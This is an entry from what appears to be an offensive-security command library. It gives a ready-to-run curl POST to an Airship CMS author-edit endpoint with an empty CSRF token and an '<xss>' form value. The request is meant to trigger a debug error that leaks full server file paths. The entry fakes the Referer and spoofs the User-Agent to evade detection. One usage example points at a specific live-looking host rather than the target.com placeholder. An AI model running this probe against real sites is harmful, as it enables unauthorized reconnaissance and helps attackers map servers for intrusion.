---
id: ebe02548-9cd8-4068-89cc-4e8b2f5526c5
name: curl-post-csrf-failure
type: command
executor: bash
data: >-
  curl -X POST https://target.com/author/edit/7 -H "Host: target.com" -H
  "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101
  Firefox/47.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer:
  https://target.com/author/edit/7" -H "Cookie: __cfduid=any; PHPSESSID=any;
  cf_clearance=any-any-any" -H "Content-Type: application/x-www-form-urlencoded"
  -d
  "_CSRF_TOKEN=&name=%3Cxss%3E&byline=&format=Rich+Text&biography=%3Ch2%3Exxxxxx%3Cbr%3E%3C%2Fh2%3E&_wysihtml5_mode=1&save_btn=sav"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:03.575Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web
  - http
  - csrf
  - recon
verified: false
validated: true
submitted: true
---

# curl-post-csrf-failure

## Command

```bash
curl -X POST https://target.com/author/edit/7 -H "Host: target.com" -H "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://target.com/author/edit/7" -H "Cookie: __cfduid=any; PHPSESSID=any; cf_clearance=any-any-any" -H "Content-Type: application/x-www-form-urlencoded" -d "_CSRF_TOKEN=&name=%3Cxss%3E&byline=&format=Rich+Text&biography=%3Ch2%3Exxxxxx%3Cbr%3E%3C%2Fh2%3E&_wysihtml5_mode=1&save_btn=sav"
```

## Description

This command uses curl to send a POST request to an Airship CMS author edit endpoint with an invalid or missing CSRF token, triggering a validation failure in debug mode to disclose full server file paths in the error response. It is used for information disclosure reconnaissance on PHP web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://target.com/author/edit/7` | Target URL with author ID (replace target.com and ID as needed) | Yes |
| `-H "Host: target.com"` | Sets the Host header to match the target domain | Yes |
| `-H "User-Agent: ..."` | Mimics a browser User-Agent to evade basic detection | Yes |
| `-H "Accept: ..."` | Sets accepted content types for HTML responses | Yes |
| `-H "Referer: ..."` | Fakes the referer to simulate form submission | Yes |
| `-H "Cookie: ..."` | Includes session cookies (replace with actual if known) | No |
| `-H "Content-Type: ..."` | Sets form-encoded content type | Yes |
| `-d "..."` | POST body with empty CSRF token and form data to trigger error | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://bridge.cspr.ng/author/edit/7 [headers and data as above]
```

### Advanced Usage

```bash
curl -X POST https://target.com/author/edit/7 -H "Host: target.com" [other headers] -d "_CSRF_TOKEN=&[custom payload]" -v > error_response.txt
```

Use `-v` for verbose output and redirect to file for analysis.

## Expected Output

A HTTP error response (e.g., 500 Internal Server Error) containing a detailed PHP exception stack trace, including lines like "Fatal error: ... in /full/path/to/airship/cms/validate_csrf.php on line 123". Look for absolute paths revealing the server's filesystem structure.

## Related

- [[Related Procedure|procedures/Trigger-Full-Path-Disclosure-via-CSRF-Failure]]
